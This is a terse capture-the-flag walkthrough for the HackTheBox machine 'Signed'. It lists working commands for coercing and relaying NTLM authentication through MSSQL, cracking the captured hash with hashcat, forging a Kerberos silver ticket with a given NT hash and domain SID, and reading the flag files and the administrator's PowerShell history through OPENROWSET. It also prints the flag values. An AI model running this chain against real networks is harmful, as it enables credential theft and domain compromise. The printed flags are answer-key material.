# HackTheBox - Signed
**Youtube video:** https://youtu.be/_ZVxncSmVaU
---
## Initial Foothold

**NTLM Relay Attack:**
```bash
# Start Responder
sudo responder -I tun0 -vA

# Coerce authentication via MSSQL
nxc mssql $IP -u $user2 -p $pass2 -M mssql_coerce -o l=10.10.15.78
```

**Crack NTLMv2 Hash:**
```bash
# Crack captured hash
hashcat -m 5600 hashes.ntlmv2 /home/kali/Desktop/wordlists/rockyou.txt
```

---
## MSSQL Enumeration

**Check Privileges:**
```bash
# Check if sysadmin
nxc mssql $IP -u $user -p $pass --local-auth -q "select is_SRVROLEMEMBER('sysadmin');"

# Enumerate impersonation privileges
nxc mssql $IP -u $user -p $pass --local-auth -M enum_impersonate

# Enumerate logins
nxc mssql $IP -u $user -p $pass --local-auth -M enum_logins
```

**MSSQL Access:**
```bash
# Connect to MSSQL
impacket-mssqlclient mssqlsvc:pass@$IP
```

---
## Silver Ticket Attack

**Step 1: Convert Password to NTLM Hash**
```bash
# Convert password to NTLM hash
echo -n 'password' | iconv -t UTF-16LE | openssl md4
```

**Step 2: Enumerate Domain SID**
```sql
# In MSSQL session
SQL (SIGNED\mssqlsvc guest@master)> SELECT SUSER_SID('SIGNED\MSSQLSVC');
# Result: 0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000

# Convert hex to SID and remove last 3 digits (512-RID)
python3 -c "import struct; sid=bytes.fromhex('YOUR_HEX_HERE'); print('S-{}-{}-{}'.format(sid[0], int.from_bytes(sid[2:8], 'big'), '-'.join(str(struct.unpack('<I', sid[i:i+4])[0]) for i in range(8, len(sid), 4))))"
# Result: S-1-5-21-4088429403-1159899800-2753317549
```

**Step 3: Create Silver Ticket**
```bash
# Generate silver ticket
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.SIGNED.HTB -user-id 1103 -groups '512,1105' strikoderticket

# Export ticket
export KRB5CCNAME=strikoderticket.ccache

# Connect using Kerberos
impacket-mssqlclient -k DC01.signed.htb -windows-auth -no-pass
```

---
## Privilege Escalation & Flag Retrieval

**Read Files via OPENROWSET:**
```sql
# Read user flag
SQL (SIGNED\mssqlsvc dbo@master)> select * from openrowset(bulk 'C:\users\mssqlsvc\Desktop\user.txt', SINGLE_CLOB) as strikoder;
# BulkColumn: b'50cbc26e73f5f4bf8ee9394a99de9bec\r\n'

# Read root flag
SQL (SIGNED\mssqlsvc dbo@master)> select * from openrowset(bulk 'C:\users\Administrator\Desktop\root.txt', SINGLE_CLOB) as strikoder;
# BulkColumn: b'f576e37b943567fc9ef3b6a66d0f7d5c\r\n'

# Read PowerShell history
SQL (SIGNED\mssqlsvc dbo@master)> select * from openrowset(bulk 'C:\users\administrator\appdata\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt', SINGLE_CLOB) as strikoder;
```
